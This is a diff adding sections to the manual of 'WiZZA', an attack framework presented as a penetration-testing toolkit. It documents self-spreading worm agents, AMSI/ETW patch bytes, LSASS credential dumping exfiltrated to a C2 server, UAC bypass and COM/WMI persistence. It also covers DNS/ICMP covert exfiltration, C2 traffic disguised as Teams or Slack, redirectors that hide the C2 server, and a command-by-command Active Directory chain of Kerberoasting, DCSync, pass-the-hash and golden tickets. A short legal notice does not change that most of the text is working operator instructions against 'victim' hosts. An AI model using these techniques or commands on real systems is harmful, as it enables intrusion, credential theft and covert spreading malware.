@@ -32,7 +32,7 @@ header-includes:
 
 # Preface
 
-**WiZZA** is a comprehensive, integrated penetration testing framework for authorized security assessments. It combines phishing, man-in-the-middle interception, C2 infrastructure, worm agents, kernel privilege escalation, mobile device attacks, shellcode generation, and AV/EDR evasion into a single coherent toolkit controlled through one CLI.
+**WiZZA** is a comprehensive, integrated penetration testing framework for authorized security assessments. It combines phishing, man-in-the-middle interception, C2 infrastructure, worm agents, kernel privilege escalation, mobile device attacks, shellcode generation, AV/EDR evasion, Active Directory attacks, SOCKS5 proxy pivoting, interactive PTY shells, DNS/ICMP covert channels, LLMNR/NBT-NS credential capture, malleable C2 profiles, traffic redirectors, and automated reporting into a single coherent toolkit controlled through one CLI.
 
 > **LEGAL NOTICE:** This toolkit is designed exclusively for authorized penetration testing, red team engagements, CTF competitions, and security research. Unauthorized use against systems you do not own or have explicit written permission to test is illegal and unethical. Always obtain written authorization before any engagement.
 
@@ -43,36 +43,56 @@ header-includes:
 ## System Topology
 
 ```
-+-----------------------------------------------------------------+
-|                        OPERATOR MACHINE (Kali)                   |
-|                                                                   |
-|  start CLI --> C2 Server :8888 --> cloudflared tunnel           |
-|       |             |                      |                      |
-|       |         /panel (UI)         https://xyz.trycloudflare.com|
-|       |         /download/*                |                      |
-|       |         /cdn-cgi/apps/*            |                      |
-|       |                                    |                      |
-|  +----+------------------------------------+                     |
-|  |  Modules                                                       |
-|  +- op/c2/c2_server.py          C2 server + web panel            |
-|  +- op/payloads/                Baked agent payloads              |
-|  +- op/evade/poly_engine.py     Per-request mutation engine       |
-|  +- op/evade/stego.py           Steganography                     |
-|  +- op/evade/stealth.py         Anti-forensics helpers            |
-|  +- op/exploit/                 PDF, Office, browser exploits     |
-|  +- op/kernel/exploits/         Kernel CVE sources                |
-|  +- op/mobile/                  Android APK, iOS MDM              |
-|  +- op/mitm/                    MitM proxy hooks                  |
-|  +- op/bitb/                    Browser-in-the-Browser            |
-+-----------------------------------------------------------------+
++--------------------------------------------------------------------+
+|                     OPERATOR MACHINE (Kali)                         |
+|                                                                      |
+|  start CLI --> C2 Server :8888 --> cloudflared / Tor hidden svc    |
+|       |             |                      |                         |
+|       |         /panel (UI)         https://xyz.trycloudflare.com   |
+|       |         /download/*         or https://<hash>.onion          |
+|       |         /cdn-cgi/apps/*                                      |
+|       |         /pty/<aid>/stream   (xterm.js PTY shell)             |
+|       |         /proxy/<aid>/poll   (SOCKS5 tunnel relay)            |
+|       |         /netmap             (real-time network map)          |
+|       |         /report             (auto pentest report)            |
+|       |                                                               |
+|  +----+-----------------------------------------------------------+  |
+|  |  Core                                                           |  |
+|  +- op/c2/c2_server.py        C2 server + web panel + endpoints   |  |
+|  +- op/c2/proxy_socks.py      SOCKS5 pivot server (:1080)         |  |
+|  +- op/c2/pty_handler.py      PTY session manager + xterm.js HTML |  |
+|  +- op/c2/static/netmap.html  Force-directed network map          |  |
+|  +- op/payloads/              Baked agent payloads                 |  |
+|  |  Modules                                                        |  |
+|  +- op/modules/edr_bypass.py  AMSI/ETW/NTDLL/UAC/LSASS/WMI/COM   |  |
+|  +- op/modules/c2_profiles.py Malleable C2 (Teams/Slack/CDN/...)  |  |
+|  +- op/modules/dns_c2.py      DNS TXT covert channel + ICMP exfil |  |
+|  +- op/modules/llmnr_poison.py LLMNR/NBT-NS poisoner + NTLMv2    |  |
+|  +- op/modules/redirector.py  Apache/Nginx/Caddy redirector gen   |  |
+|  +- op/modules/ad_attacks.py  AD: Kerberoast/DCSync/PTH/BloodHound|  |
+|  +- op/modules/report_gen.py  Auto HTML/JSON/CSV pentest report   |  |
+|  |  Evasion                                                        |  |
+|  +- op/evade/poly_engine.py   Per-request mutation engine         |  |
+|  +- op/evade/stego.py         Steganography                       |  |
+|  +- op/evade/stealth.py       Anti-forensics helpers              |  |
+|  +- op/exploit/               PDF, Office, browser exploits       |  |
+|  +- op/kernel/exploits/       Kernel CVE sources (8 CVEs)         |  |
+|  +- op/mobile/                Android APK, iOS MDM                |  |
+|  +- op/mitm/                  MitM proxy hooks                    |  |
+|  +- op/bitb/                  Browser-in-the-Browser              |  |
++--------------------------------------------------------------------+
                                   |
-              +-------------------+--------------------+
-              v                   v                    v
-      VICTIM (Windows)    VICTIM (Linux/Mac)    VICTIM (Mobile)
-      worm_agent.ps1      worm_agent.py         APK / MDM / JS
-      AMSI+ETW patch      SSH/USB spread        GPS/mic/camera
-      WMI exec            DoH C2 fallback       JS keylogger
-      Registry persist    cron/systemd persist
+    +-----------------------------+-----------------------------+
+    v                             v                             v
+VICTIM (Windows)         VICTIM (Linux/Mac)             VICTIM (Mobile)
+worm_agent.ps1           worm_agent.py                  APK / MDM / JS
+AMSI+ETW patch           SSH/USB spread                 GPS/mic/camera
+UAC bypass               DoH/ICMP C2 fallback           JS keylogger
+WMI persist              cron/systemd persist
+COM hijack               PTY shell (pty.openpty)
+SOCKS5 tunnel loop       AD attack commands
+LSASS dump               BloodHound collection
+Kerberoasting            Golden/Silver ticket
 ```
 
 ## Component Relationships
@@ -81,11 +101,21 @@ header-includes:
 |-----------|----------|------|------|
 | `start` | Bash | — | Master CLI, orchestrates everything |
 | `c2_server.py` | Python 3 | :8888 | Agent listener, web panel, loot storage |
+| `proxy_socks.py` | Python 3 | :1080 | SOCKS5 pivot relay server |
+| `pty_handler.py` | Python 3 | — | PTY session manager + xterm.js SSE stream |
+| `static/netmap.html` | HTML/JS | — | Real-time force-directed network map |
 | `worm_agent.py` | Python 3 | — | Multi-vector worm for Linux/Mac/Windows |
 | `worm_agent.ps1` | PowerShell | — | Windows-optimized worm + agent |
 | `stage1.ps1` / `stage1.py` | PS1/PY | — | Tiny first-stage stagers |
 | `poly_engine.py` | Python 3 | — | Multi-layer mutation engine |
 | `stego.py` | Python 3 | — | PNG LSB + JPEG EXIF payload hiding |
+| `edr_bypass.py` | Python 3 | — | AMSI/ETW/UAC/LSASS/WMI/COM/process hollow |
+| `c2_profiles.py` | Python 3 | — | Malleable C2: Teams/Slack/OneDrive/GitHub/CDN |
+| `dns_c2.py` | Python 3 | — | DNS TXT covert channel + ICMP exfil |
+| `llmnr_poison.py` | Python 3 | 137/5355 | LLMNR/NBT-NS poisoner + NTLMv2 capture |
+| `redirector.py` | Python 3 | — | Apache/Nginx/Caddy redirector config generator |
+| `ad_attacks.py` | Python 3 | — | Kerberoast/AS-REP/DCSync/PTH/BloodHound |
+| `report_gen.py` | Python 3 | — | Auto HTML/JSON/CSV pentest report |
 | `bitb/catcher.py` | Python 3 | :8082 | Browser-in-the-Browser catcher |
 | `mitm/catcher.py` | Python 3 | :9999 | Keystroke log receiver |
 | `mitm/intercept.py` | Python 3 | :8083 | mitmproxy JS injection hook |
@@ -213,9 +243,14 @@ python3 op/payloads/shellcode/gen_shellcode.py --list-payloads
 ```
 /home/heilige/Keylogger/
 +-- start                     <- Main CLI (run this)
++-- WIZZA_MANUAL.pdf          <- This document
 +-- op/
 |   +-- c2/
-|   |   +-- c2_server.py      <- C2 server
+|   |   +-- c2_server.py      <- C2 server + web panel + all endpoints
+|   |   +-- proxy_socks.py    <- SOCKS5 pivot relay (:1080)
+|   |   +-- pty_handler.py    <- PTY session manager + xterm.js SSE
+|   |   +-- static/
+|   |       +-- netmap.html   <- Real-time force-directed network map
 |   +-- payloads/
 |   |   +-- worm_agent.py     <- Python worm (template)
 |   |   +-- worm_agent.ps1    <- PS1 worm (template)
@@ -229,6 +264,14 @@ python3 op/payloads/shellcode/gen_shellcode.py --list-payloads
 |   |   +-- shellcode/
 |   |       +-- gen_shellcode.py   <- Shellcode generator
 |   |       +-- revshell_x64.asm  <- NASM x64 shell source
+|   +-- modules/
+|   |   +-- edr_bypass.py     <- AMSI/ETW/NTDLL/UAC/LSASS/WMI/COM/hollow
+|   |   +-- c2_profiles.py    <- Malleable C2 (Teams/Slack/OneDrive/GitHub/CDN)
+|   |   +-- dns_c2.py         <- DNS TXT covert channel + ICMP exfil
+|   |   +-- llmnr_poison.py   <- LLMNR/NBT-NS poisoner + NTLMv2 capture
+|   |   +-- redirector.py     <- Apache/Nginx/Caddy redirector generator
+|   |   +-- ad_attacks.py     <- AD: Kerberoast/AS-REP/DCSync/PTH/BloodHound
+|   |   +-- report_gen.py     <- Auto HTML/JSON/CSV pentest report
 |   +-- evade/
 |   |   +-- poly_engine.py    <- Polymorphic mutation engine
 |   |   +-- obfuscate_ps1.py  <- PS1 obfuscator
@@ -244,7 +287,6 @@ python3 op/payloads/shellcode/gen_shellcode.py --list-payloads
 |   +-- mobile/               <- Android/iOS attack modules
 |   +-- mitm/                 <- MitM proxy hooks
 |   +-- bitb/                 <- BitB phishing
-+-- WIZZA_MANUAL.pdf          <- This document
 ```
 
 \newpage
@@ -283,6 +325,11 @@ python3 op/payloads/shellcode/gen_shellcode.py --list-payloads
 | `start kernel [check|exploit|rootkit|ebpf]` | Kernel attacks |
 | `start mobile [android|ios|browser|termux]` | Mobile attacks |
 | `start physical <victim_ip> <domain>` | LAN ARP MitM (requires root) |
+| `start llmnr [start|stop|hashes]` | LLMNR/NBT-NS poisoner + NTLMv2 capture |
+| `start redirector [apache|nginx|caddy|socat]` | Generate C2 redirector configs |
+| `start profile [list|set <name>]` | Set/show active malleable C2 profile |
+| `start report [html|json|csv]` | Generate pentest report from live agent data |
+| `start netmap` | Open real-time network map in browser |
 
 ## Worm Control Shortcuts
 
@@ -618,6 +665,56 @@ Or run: `c2 panel`
 |---------|--------|
 | `INJECT <base64_shellcode>` | Inject shellcode into svchost.exe |
 | `RUN_PS <code>` | Execute AMSI-bypassed PowerShell |
+
+**EDR / Evasion (Windows):**
+
+| Command | Action |
+|---------|--------|
+| `AMSI_BYPASS` | Patch AmsiScanBuffer → return CLEAN (ctypes) |
+| `ETW_BYPASS` | Patch EtwEventWrite → ret (silence Defender telemetry) |
+| `NTDLL_UNHOOK` | Reload clean ntdll.dll from disk to remove EDR hooks |
+| `UAC_BYPASS` | fodhelper/sdclt COM handler UAC bypass → SYSTEM shell |
+| `IMPERSONATE_SYSTEM` | Steal SYSTEM token from winlogon/lsass |
+| `LSASS_DUMP` | comsvcs.dll MiniDump LSASS → base64-exfil to C2 |
+| `WMI_PERSIST` | WMI __EventFilter + CommandLineEventConsumer persistence |
+| `COM_HIJACK` | HKCU MMDeviceEnumerator InprocServer32 COM hijack |
+
+**Active Directory:**
+
+| Command | Action |
+|---------|--------|
+| `AD_ENUM <dc_ip> <domain> <user> <pass>` | LDAP enum: users, groups, computers, trusts |
+| `KERBEROAST <dc_ip> <domain> <user> <pass>` | TGS request for SPN accounts → hashcat -m 13100 |
+| `AS_REP_ROAST <dc_ip> <domain> <users_file>` | AS-REP for accounts without pre-auth → hashcat -m 18200 |
+| `DCSYNC <dc_ip> <domain> <user> <pass> [target]` | secretsdump.py domain replication → NTLM hashes |
+| `BLOODHOUND <dc_ip> <domain> <user> <pass>` | bloodhound-python collection → .json for BloodHound |
+| `PASS_THE_HASH <target> <domain> <user> <hash>` | wmiexec/psexec PTH lateral movement |
+| `GOLDEN_TICKET <domain> <sid> <krbtgt_hash>` | Forge Kerberos TGT for any user |
+
+**PTY Shell:**
+
+| Command | Action |
+|---------|--------|
+| `PTY_START` | Spawn interactive PTY shell, relay via C2 SSE |
+| `PTY_STOP` | Kill PTY shell |
+
+Open the PTY terminal in the C2 panel: **Agents → Shell** button, or:
+```
+https://localhost:8888/pty/<agent_id>/term
+```
+
+**SOCKS5 Proxy:**
+
+| Command | Action |
+|---------|--------|
+| `PROXY_START` | Start SOCKS5 relay loop (agent polls C2 for tunnel tasks) |
+| `PROXY_STOP` | Stop SOCKS5 relay |
+
+Configure your tools to use the SOCKS5 proxy at `socks5://localhost:1080`:
+```bash
+proxychains nmap -sT -p 80,443,22 192.168.10.0/24
+curl --socks5 localhost:1080 http://internal.corp/admin
+```
 
 ---
 
@@ -1109,6 +1206,599 @@ Agents include multiple Sysmon evasion techniques:
 
 ---
 
+## EDR Bypass Module
+
+### What It Does
+
+`op/modules/edr_bypass.py` provides Python/ctypes implementations of advanced Windows defense bypass and post-exploitation techniques. All operations run in-process — no dropped binaries.
+
+### Techniques
+
+| Function | Technique | Effect |
+|----------|-----------|--------|
+| `amsi_patch()` | Write `\xB8\x57\x00\x07\x80\xC3` to AmsiScanBuffer | AMSI returns CLEAN for all scans |
+| `etw_patch()` | Write `\xC3` to EtwEventWrite | All ETW events from this process silenced |
+| `ntdll_unhook()` | Map clean ntdll copy from `\KnownDlls\ntdll.dll` | Remove inline hooks placed by EDR |
+| `process_hollow(target, payload)` | CreateProcess SUSPENDED + WriteProcessMemory | Execute shellcode inside legitimate process |
+| `reflective_dll_inject(pid, dll_bytes)` | VirtualAllocEx + WriteProcessMemory + CreateRemoteThread | Load DLL into remote process without LoadLibrary |
+| `uac_bypass_fodhelper(cmd)` | HKCU `ms-settings\Shell\Open\command` + fodhelper.exe | Run elevated without UAC prompt |
+| `impersonate_system()` | OpenProcessToken(winlogon) + DuplicateToken | Impersonate SYSTEM |
+| `lsass_dump(output_path)` | `rundll32 comsvcs.dll,MiniDump` LOLBin | LSASS memory dump for credential extraction |
+| `wmi_persist(name, cmd)` | __EventFilter + CommandLineEventConsumer | Run on every logon event |
+| `com_hijack(dll_path)` | HKCU MMDeviceEnumerator InprocServer32 | Load DLL on next AudioEndpointBuilder query |
+
+### Usage from Agent
+
+Send via C2 panel or `start` CLI (Windows agents only):
+
+```
+AMSI_BYPASS          <- Patch AMSI
+ETW_BYPASS           <- Patch ETW
+NTDLL_UNHOOK         <- Remove EDR hooks
+UAC_BYPASS           <- Elevate to admin
+IMPERSONATE_SYSTEM   <- Get SYSTEM token
+LSASS_DUMP           <- Dump creds to C2
+WMI_PERSIST          <- Install WMI persistence
+COM_HIJACK           <- Install COM hijack
+```
+
+### Verification
+
+```powershell
+# Verify AMSI patched (run on victim):
+# This string normally triggers Defender — if AMSI is patched, no alert:
+$x = 'Am'+'siScan'+'Buffer'
+[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dGVzdA=='))
+```
+
+---
+
+## Malleable C2 Profiles
+
+### What It Does
+
+`op/modules/c2_profiles.py` modifies the C2 server's HTTP response headers and request routing on-the-fly to mimic legitimate SaaS and CDN traffic. A network defender looking at Wireshark sees normal business application traffic, not C2 beacons.
+
+### Available Profiles
+
+| Profile | Mimics | Paths | User-Agent |
+|---------|--------|-------|-----------|
+| `default` | Cloudflare CDN | `/cdn-cgi/apps/*` | Chrome 124 |
+| `teams` | Microsoft Teams | `/v2/conversations/*/messages` | Teams/1.0 Desktop |
+| `slack` | Slack | `/api/conversations.history` | Slack/MacDesktop |
+| `onedrive` | OneDrive | `/personal/sync/delta` | OneDrive-SkyAPI |
+| `github` | GitHub API | `/repos/*/git/blobs/*` | github-actions/... |
+| `gmail` | Gmail API | `/gmail/v1/users/me/messages` | Google-API-Java-Client |
+| `cdn` | Generic CDN | `/static/js/*.chunk.js` | Chrome 124 |
+
+### Usage
+
+```bash
+# List profiles
+start profile list
+
+# Activate a profile (live — no C2 restart needed)
+start profile set teams
+start profile set slack
+start profile set github
+
+# From C2 panel:
+# Settings -> C2 Profile -> select -> Apply
+```
+
+### Notes
+
+- Profile applies to **new** agent registrations; existing agents continue using their baked-in URL paths
+- If your target network monitors for specific SaaS (e.g., blocks Teams), pick a different profile
+- Combine with a custom domain for maximum convincingness: `teams.yourdomain.com` with Teams profile
+
+---
+
+## DNS C2 Channel
+
+### What It Does
+
+`op/modules/dns_c2.py` provides a covert command and control channel using DNS TXT queries and ICMP packets. Used when HTTP/HTTPS is blocked or monitored, but DNS and ICMP are allowed.
+
+### DNS TXT Channel
+
+Commands are encoded into DNS TXT record queries via Cloudflare DoH:
+
+```
+Agent -> DNS query: TXT <base64_cmd>.c2.yourdomain.com
+C2 responds with: TXT record = <base64_response>
+```
+
+Data is chunked into 63-byte DNS label segments. Each beacon cycle queries for a fresh TXT record.
+
+### ICMP Exfil Channel
+
+File/data exfiltration via raw ICMP echo packets:
+
+```
+Agent -> ICMP echo request, payload = XOR(<data_chunk>, <xor_key>)
+C2 sniffs ICMP stream -> XOR-decrypts -> reassembles file
+```
+
+Requires raw socket access on victim (`CAP_NET_RAW` or root/SYSTEM).
+
+### Configuration
+
+```bash
+# In c2_server.py environment:
+DNS_C2_DOMAIN=c2.yourdomain.com   # Your controlled domain
+DNS_C2_KEY=0xAB                    # XOR key for ICMP (1 byte)
+```
+
+Victim must be able to reach your DNS server (Cloudflare DoH proxy relays it):
+```
+Victim -> HTTPS://1.1.1.1/dns-query?name=<cmd>.c2.domain&type=TXT
+```
+
+### When To Use
+
+- Outbound HTTP/HTTPS is blocked by WAF or proxy
+- Target allows DNS (almost universal)
+- Firewall allows ICMP (common on internal networks)
+- Ultra-low-bandwidth exfil of small secrets (credentials, keys)
+
+---
+
+## LLMNR / NBT-NS Poisoner
+
+### What It Does
+
+`op/modules/llmnr_poison.py` listens for Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) broadcast queries. When a Windows host can't resolve a name via DNS, it falls back to broadcasting LLMNR/NBT-NS — WiZZA responds with the attacker's IP, causing the victim to attempt NTLMv2 authentication. The NTLMv2 hash is captured and saved in hashcat format.
+
+### Attack Flow
+
+```
+Victim types \\FILESERVER in Explorer (doesn't exist)
+  -> DNS fails
+  -> LLMNR broadcast: "Who is FILESERVER?"
+  -> WiZZA: "I am FILESERVER, I'm at <attacker_ip>"
+  -> Victim connects to attacker's SMB server
+  -> Sends NTLMv2 challenge response
+  -> WiZZA captures the NTLMv2 hash
+  -> Crack offline: hashcat -m 5600 hashes.txt rockyou.txt
+```
+
+### Quick Start
+
+```bash
+# Start the poisoner
+start llmnr start
+
+# Watch captured hashes live
+start llmnr hashes
+
+# Stop
+start llmnr stop
+```
+
+Or via C2 panel: **LLMNR/NBT-NS** sidebar button.
+
+### Captured Hash Format
+
+Hashes are captured in hashcat NTLMv2 format (`-m 5600`):
+
+```
+ALICE::CORP:1122334455667788:a3f6c1...d9e2:0101000000000000...
+```
+
+Crack with:
+```bash
+hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt --rules-file best64.rule
+```
+
+### Requirements
+
+- Run as root (ports 137, 445, 5355 are privileged)
+- Must be on the same local subnet as victims (layer-2 adjacency)
+- Windows hosts with LLMNR/NBT-NS enabled (default on all Windows versions)
+
+### Notes
+
+- Works on all unpatched Windows versions (XP through Server 2022 by default)
+- Can be mitigated by GPO: disable LLMNR (`Computer Configuration -> Administrative Templates -> DNS Client -> Turn off multicast name resolution`)
+- Combine with Responder for full WPAD/LDAP/FTP/HTTP capture
+
+---
+
+## Redirectors and Domain Fronting
+
+### What It Does
+
+`op/modules/redirector.py` generates server configuration files for Apache, Nginx, and Caddy that act as a traffic redirector in front of your C2. Only valid beacon requests are forwarded; everything else gets a 302 to a decoy (legitimate) website. This protects the real C2 IP from discovery.
+
+```
+Internet  ->  Redirector VPS  ->  Real C2
+                    |
+                    v (invalid requests)
+               decoy website
+```
+
+### Apache Redirector
+
+```bash
+start redirector apache
+# Prompts: C2 host:port, beacon path(s), decoy URL
+# Output: /tmp/wizza_redirector.conf
+```
+
+Generated config (abbreviated):
+```apache
+RewriteEngine On
+RewriteCond %{REQUEST_URI} !^/cdn-cgi/apps/
+RewriteRule ^(.*)$ https://microsoft.com/ [R=302,L]
+RewriteRule ^/cdn-cgi/apps/(.*)$ https://c2.internal:8888/cdn-cgi/apps/$1 [P,L]
+```
+
+### Nginx Redirector
+
+```bash
+start redirector nginx
+# Output: /tmp/wizza_nginx.conf
+```
+
+```nginx
+location ~ ^/cdn-cgi/apps/ {
+    proxy_pass https://c2.internal:8888;
+    proxy_set_header Host $host;
+}
+location / {
+    return 302 https://microsoft.com/;
+}
+```
+
+### Caddy Redirector
+
+```bash
+start redirector caddy
+# Output: /tmp/Caddyfile
+# Caddy auto-provisions Let's Encrypt TLS
+```
+
+### Socat TCP Forwarder
+
+Quick low-footprint redirector using socat:
+```bash
+start redirector socat
+# Prints the socat command to run on redirector VPS:
+socat TCP-LISTEN:443,fork,reuseaddr TCP:c2.internal:8888
+```
+
+### Domain Fronting
+
+Domain fronting routes C2 traffic through a CDN (Cloudflare, Fastly, Azure Front Door) so it appears to come from a trusted CDN domain:
+
+```
+Victim -> https://cloudflare.com/cdn-cgi/apps/sync (Host: your-worker.pages.dev)
+                    -> Cloudflare routes to your backend
+```
+
+WiZZA's default CDN traffic disguise is already compatible with Cloudflare domain fronting when you have a Workers/Pages site. See `op/modules/redirector.py` → `domain_fronting_guide()` for provider-specific instructions.
+
+---
+
+## PTY Interactive Shell
+
+### What It Does
+
+Gives you a full interactive terminal (not just one-shot command execution) on any agent. Uses `pty.openpty()` on Linux/Mac or `conpty`/subprocess on Windows. Terminal output streams to your browser via Server-Sent Events (SSE) and keystrokes go back via POST.
+
+### Architecture
+
+```
+Browser xterm.js  <-- SSE /pty/<aid>/stream  ←-- C2 ←-- HTTP POST ← agent PTY output
+Browser xterm.js  --► POST /pty/<aid>/input  --► C2 --► HTTP poll → agent PTY stdin
+```
+
+### Usage
+
+**From C2 panel:** Click **Shell** button next to any agent.
+
+**Direct URL:**
+```
+https://localhost:8888/pty/<agent_id>/term
+```
+
+**From start CLI:**
+```bash
+start netmap    # Open network map -> click agent -> Shell button
+```
+
+**Agent command:**
+```
+PTY_START       <- Spawn PTY shell
+PTY_STOP        <- Kill PTY shell
+```
+
+### Features
+
+- Full color terminal with xterm.js (256-color + Unicode)
+- Ctrl+C, Ctrl+Z, Ctrl+D key injection buttons
+- Terminal resize propagated to agent PTY (SIGWINCH)
+- 5000-line scrollback buffer
+- Kill PTY button with confirmation
+
+### Notes
+
+- PTY works on Linux/Mac agents; Windows uses `cmd.exe` subprocess
+- SSE stream uses base64 encoding of raw PTY bytes (handles ANSI escapes cleanly)
+- Browser tab can be closed and reopened — session stays alive until `PTY_STOP`
+
+---
+
+## SOCKS5 Proxy Pivoting
+
+### What It Does
+
+`op/c2/proxy_socks.py` turns any agent into a SOCKS5 proxy, routing your tool traffic through the agent's network without a dedicated VPN or second C2 hop. The agent polls the C2 for pending connections, establishes TCP to targets, and relays data bidirectionally.
+
+### Architecture
+
+```
+Your tool  ->  SOCKS5 :1080  ->  C2 relay  ->  HTTP poll  ->  Agent  ->  Target host
+```
+
+### Quick Start
+
+**Step 1 — Start proxy relay in agent:**
+```
+PROXY_START   <- Send from C2 panel to agent
+```
+
+**Step 2 — Use proxy from your tools:**
+```bash
+# With proxychains (edit /etc/proxychains4.conf):
+socks5 127.0.0.1 1080
+proxychains nmap -sT -p 80,443,22,3389 10.0.1.0/24
+proxychains crackmapexec smb 10.0.1.0/24 -u admin -p 'Password1'
+
+# With curl:
+curl --socks5 localhost:1080 http://10.0.1.50/
+
+# With metasploit:
+setg Proxies socks5:127.0.0.1:1080
+```
+
+**Stop:**
+```
+PROXY_STOP    <- Send from C2 panel
+```
+
+### View Active Tunnels
+
+```
+https://localhost:8888/proxy/<agent_id>/sessions
+```
+
+Or C2 panel → **Proxy Sessions** tab.
+
+### Notes
+
+- SOCKS5 server binds to `127.0.0.1:1080` (operator machine only — not exposed externally)
+- Supports TCP (CONNECT method); UDP associate not implemented
+- Throughput is limited by C2 HTTP polling interval (typically 1–5 s); suitable for recon but not bulk transfers
+- Run multiple agents for multi-hop routing: `proxychains proxychains ...`
+
+---
+
+## Active Directory Attacks
+
+### What It Does
+
+`op/modules/ad_attacks.py` wraps Impacket, ldap3, and BloodHound tooling into a unified interface callable from the C2 panel or CLI. Provides the full attack chain from domain enumeration through credential extraction and lateral movement.
+
+### Prerequisites
+
+```bash
+pip install impacket ldap3 bloodhound
+# or:
+sudo apt-get install python3-impacket bloodhound
+```
+
+### Attack Techniques
+
+#### Domain Enumeration
+
+```
+AD_ENUM <dc_ip> <domain> <user> <pass>
+# or: AD_ENUM 10.0.0.1 corp.local admin Password1
+```
+
+Collects via LDAP:
+- All users (enabled/disabled, last logon, password last set)
+- All groups and memberships
+- All computers with OS version
+- Domain trusts
+- Domain password policy
+
+#### Kerberoasting
+
+```
+KERBEROAST <dc_ip> <domain> <user> <pass>
+```
+
+Requests TGS tickets for all SPN accounts. Outputs hashes in hashcat `-m 13100` format:
+
+```bash
+hashcat -m 13100 kerberoast_hashes.txt rockyou.txt
+```
+
+#### AS-REP Roasting
+
+```
+AS_REP_ROAST <dc_ip> <domain> <users_file>
+```
+
+Targets accounts with "Do not require Kerberos preauthentication" set. Outputs hashcat `-m 18200` format:
+
+```bash
+hashcat -m 18200 asrep_hashes.txt rockyou.txt
+```
+
+#### DCSync
+
+```
+DCSYNC <dc_ip> <domain> <user> <pass>
+DCSYNC <dc_ip> <domain> <user> <pass> Administrator
+```
+
+Uses MS-DRSR replication protocol (secretsdump.py) to replicate domain password database without running code on the DC:
+
+```
+[+] Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[+] krbtgt:502:...:<NT_HASH>:::
+```
+
+Requires: DA group membership or Replicating Directory Changes All rights.
+
+#### Pass the Hash
+
+```
+PASS_THE_HASH <target> <domain> <user> <nt_hash> [cmd]
+```
+
+Uses wmiexec/psexec/smbexec to authenticate with NTLM hash directly (no password needed):
+
+```
+PASS_THE_HASH 10.0.0.20 corp.local Administrator 31d6cfe0d16ae931b73c59d7e0c089c0 whoami
+```
+
+#### Golden Ticket
+
+```
+GOLDEN_TICKET <domain> <domain_sid> <krbtgt_hash> [username]
+```
+
+Forges a Kerberos TGT valid for any user (including domain admins) using the krbtgt NTLM hash:
+
+```
+GOLDEN_TICKET corp.local S-1-5-21-... aabbccdd...ff Administrator
+# Outputs: golden.ccache  <- Import: export KRB5CCNAME=golden.ccache
+```
+
+#### BloodHound Collection
+
+```
+BLOODHOUND <dc_ip> <domain> <user> <pass>
+```
+
+Runs bloodhound-python collector (all methods: ACL, group, LocalAdmin, RDP, DCOM, session, trusts, ObjectProps). Uploads JSON zip to C2 loot. Open in BloodHound GUI for attack path analysis.
+
+### Full Attack Chain Example
+
+```bash
+# 1. Enumerate domain
+AD_ENUM 10.0.0.1 corp.local jsmith Password1
+
+# 2. Kerberoast service accounts
+KERBEROAST 10.0.0.1 corp.local jsmith Password1
+# -> crack hash -> serviceacct:Welc0me1
+
+# 3. Use service account for DCSync
+DCSYNC 10.0.0.1 corp.local serviceacct Welc0me1
+
+# 4. Pass-the-hash as Domain Admin
+PASS_THE_HASH 10.0.0.1 corp.local Administrator <da_nt_hash> cmd.exe
+
+# 5. Forge Golden Ticket for persistence
+GOLDEN_TICKET corp.local S-1-5-21-... <krbtgt_hash>
+```
+
+---
+
+## Network Map
+
+### What It Does
+
+`op/c2/static/netmap.html` provides a real-time force-directed visualization of all C2 agents, their relationships (which agent spread to which), and their status. No external libraries required — pure vanilla JavaScript physics simulation.
+
+### Access
+
+```
+https://localhost:8888/netmap
+```
+
+Or: `start netmap` (opens in default browser)
+
+### Features
+
+- **Nodes**: C2 server (circle), worm agents (diamond), simple agents (circle)
+- **Colors**: Green = online, grey = offline, red = critical priv, orange = high, yellow = medium
+- **Edges**: Cyan = C2→agent link, pink dashed = spread log (worm infection path)
+- **Glow effects**: Online nodes have animated glow
+- **Click node**: Opens info panel with agent details (OS, user, hostname, privilege, last seen)
+- **Info panel buttons**: Screenshot, Shell, Recon, Selfdestruct
+- **Zoom/pan**: Scroll to zoom, drag background to pan
+- **Drag nodes**: Reposition individual nodes
+- **Layout toggle**: Force-directed (organic) vs. radial (tree)
+- **SVG export**: Download as vector image for reports
+- **Auto-refresh**: Polls `/agents/json` every 10s
+
+### Stats Bar
+
+Top bar shows live counts:
+```
+Hosts: 12   Online: 7   Worms: 3
+```
+
+---
+
+## Auto Report Generator
+
+### What It Does
+
+`op/modules/report_gen.py` generates a professional pentest report from live C2 agent data in HTML, JSON, or CSV format. The HTML report includes an executive summary, findings table with severity ratings, captured credentials, loot inventory, and remediation recommendations.
+
+### Usage
+
+```bash
+# From CLI:
+start report html          # Full styled HTML report
+start report json          # Machine-readable JSON
+start report csv           # Spreadsheet CSV
+
+# Direct URL (while C2 running):
+https://localhost:8888/report?fmt=html
+https://localhost:8888/report?fmt=json
+https://localhost:8888/report?fmt=csv
+```
+
+### HTML Report Contents
+
+| Section | Content |
+|---------|---------|
+| Executive Summary | Total hosts, critical/high/medium counts, assessment dates |
+| Compromised Hosts | Table: hostname, OS, user, privilege, severity, last seen |
+| Captured Credentials | All browser passwords, NTLM hashes, SSH keys |
+| Loot | List of exfiltrated files (screenshots, documents, dumps) |
+| Command Output | Agent command results log |
+| Recommendations | Severity-based remediation guidance |
+
+### Severity Heuristics
+
+| Severity | Criteria |
+|----------|----------|
+| CRITICAL | Agent running as SYSTEM, root, or Administrator |
+| HIGH | Domain user with admin group membership |
+| MEDIUM | Standard user, server OS |
+| LOW | Standard user, workstation |
+
+### Output Example
+
+```bash
+start report html
+# -> /tmp/wizza_report_20260419_1432.html
+#    Open in browser for professional HTML report
+#    Print to PDF for delivery
+```
+
+---
+
 # Troubleshooting
 
 ## C2 Server Won't Start
@@ -1331,6 +2021,21 @@ start down
 
 # Status check
 start status
+
+# LLMNR/NBT-NS credential capture
+start llmnr start
+
+# Real-time network map
+start netmap
+
+# Generate pentest report
+start report html
+
+# Set malleable C2 profile
+start profile set teams
+
+# Generate redirector config
+start redirector apache
 ```
 
 ## Payload Delivery One-Liners
@@ -1388,6 +2093,37 @@ gcc -o pwnkit_trigger pwnkit.c && \
   gcc -shared -fPIC -o lol.so pwnkit.c -DPAYLOAD_ONLY  # CVE-2021-4034
 ```
 
+## New Module Quick Reference
